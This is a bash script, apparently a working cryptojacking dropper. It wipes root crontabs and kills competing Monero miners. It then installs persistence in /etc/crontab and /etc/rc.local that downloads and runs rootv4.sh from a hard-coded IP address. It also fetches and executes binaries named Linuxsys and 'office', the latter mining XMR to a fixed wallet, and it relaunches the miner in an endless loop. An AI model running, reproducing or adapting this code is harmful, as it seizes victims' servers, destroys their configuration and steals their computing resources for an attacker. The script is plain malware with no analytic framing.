#!/bin/bash
# function unique(){
	# x=$( ps aux|grep -v grep |grep Linuxsys |wc -l )
	# if [ ${x} -gt 1 ]; then
		# for killed in $(ps aux | grep "Linuxsys" | grep -v grep | awk '{print $2}'); do
			# x=$((${x}-1))
			# if [[ ${x} -eq 1 ]]; then                      
				# continue
# }
function kills() {
	rm -rf /var/spool/cron/root
	rm -rf /var/spool/cron/crontabs/root
	rm -rf /tmp/*index_bak*
	rm -rf /tmp/*httpd.conf*
	rm -rf /tmp/*httpd.conf
	rm -rf /tmp/a7b104c270
	pkill -9 AnXqV.yam
	ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "monerohash.com:3333"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQt989KEfGRt6Ww2Xg8"|awk '{print $2}'|xargs kill -9
	ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
}

function writecrontab() {
	xcrontab=$(cat /etc/crontab | grep "http://69.165.65.252/" | grep -v grep |wc -l)
	if [ $xcrontab -eq 0 ];then
        echo "0 0 * * *   root    curl http://69.165.65.252/rootv4.sh>/etc/rootv4.sh;wget -P /etc http://69.165.65.252/rootv4.sh;rm /etc/rootv4.sh.*;bash /etc/rootv4.sh &" >> /etc/crontab
	else
        echo ""
fi
}

function writerc() {
	x=$(cat /etc/rc.local | grep "http://69.165.65.252/rootv4.sh" | grep -v grep | wc -l)
	if [ $x -eq 0 ];then
		$(sed -i "s/exit 0//g" /etc/rc.local) 
		$(sed -i "s/bash /etc/rootv3.sh//g" /etc/rc.local) 
		echo "curl http://69.165.65.252/rootv4.sh>/etc/rootv4.sh;wget -P /etc http://69.165.65.252/rootv4.sh;rm -rf /etc/rootv4.sh.*;bash /etc/rootv4.sh" >> /etc/rc.local
		echo "exit 0" >> /etc/rc.local
	else
		echo ""
	fi
}

function downloadlinuxsys() {	
	if [ ! -f Linuxsys ];then
		pwddd=$( pwd )
		curl http://69.165.65.252/Linuxsys>/usr/bin/Linuxsys && chmod +x /usr/bin/Linuxsys
		wget http://69.165.65.252/Linuxsys>/usr/bin/Linuxsys && chmod +x /usr/bin/Linuxsys
		rm -rf Linuxsys.*
		/usr/bin/Linuxsys
	else
		chmod +x /usr/bin/Linuxsys
		/usr/bin/Linuxsys
	fi
}

function downloadyam() {
	if [ ! -f "office" ];then
		curl http://69.165.65.252/office>office && chmod +x office
		wget http://69.165.65.252/office && chmod +x office
		rm -rf office.*
		./office -c x -M stratum+tcp://42Eo4G4b9CK5bTkDrBkniCb2AQSRHbHVZ6naApPKBshH2PRfxvvfVCr6Pn2pfnrc7A8hXLLKRmqyoUDiAg1cB1GL9eMMoNw:x@get.bi-chi.com:3333/xmr &
	else
		./office -c x -M stratum+tcp://42Eo4G4b9CK5bTkDrBkniCb2AQSRHbHVZ6naApPKBshH2PRfxvvfVCr6Pn2pfnrc7A8hXLLKRmqyoUDiAg1cB1GL9eMMoNw:x@get.bi-chi.com:3333/xmr &
	fi
}


linuxsysor=$(ps aux | grep /usr/bin/Linuxsys | grep -v grep | wc -l)
if [ ${linuxsysor} -eq 0 ];then
	if [ ! -f "/usr/bin/Linuxsys" ]; then
		downloadlinuxsys	
	else
		chmod 777 /usr/bin/Linuxsys
		/usr/bin/Linuxsys
	fi
else
	echo "Linuxsys-ing"
fi




pwdd=$( pwd )
while [ 1 ]
do
	kills
	p=$(ps aux | grep office | grep -v grep | wc -l)
	if [ ${p} -eq 1 ];then
		echo "officeing"
	elif [ ${p} -eq 0 ];then
		downloadyam
	else
		echo ""
	fi
	sleep 300
done
